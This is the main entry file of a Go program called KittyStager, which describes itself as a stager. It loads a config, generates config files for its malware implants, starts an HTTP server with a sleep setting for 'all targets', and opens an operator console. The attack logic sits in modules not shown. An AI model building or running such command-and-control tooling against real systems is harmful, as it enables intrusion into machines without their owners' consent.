package main

import (
	"GoStager/cmd/cli"
	"GoStager/cmd/config"
	"GoStager/cmd/http"
	"GoStager/cmd/util"
	"fmt"
	color "github.com/logrusorgru/aurora"
)

func main() {
	fmt.Println(color.Cyan("                     _\n                    / )\n                   ( (\n     A.-.A  .-\"\"-.  ) )\n    / , , \\/      \\/ /\n   =\\  t  ;=    /   /\n     `--,'  .\"\"|   /\n         || |  \\\\ \\\n        ((,_|  ((,_\\\n"))
	fmt.Println(color.Cyan("KittyStager - A simple stager written in Go\n"))
	// Get the config
	conf, err := config.GetConfig()
	if err != nil {
		util.ErrPrint(err)
		return
	}
	// Check the config
	err = conf.CheckConfig()
	if err != nil {
		util.ErrPrint(err)
		return
	}
	fmt.Println(color.Green("[+] Config loaded"))
	// Generate config file for the malware's
	err = util.GenerateConfig(conf)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	fmt.Println(color.Green("[+] Config file generated"))
	fmt.Println(color.Green("[+] Starting http server"))
	fmt.Printf("%s %d%s %s %s\n", color.Green("[+] Sleep set to"), color.Yellow(conf.GetSleep()), color.Yellow("s"), color.Green("on"), color.Yellow("all targets"))
	// Start the http server
	go http.CreateHttpServer(conf)
	err = cli.Cli(conf)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}
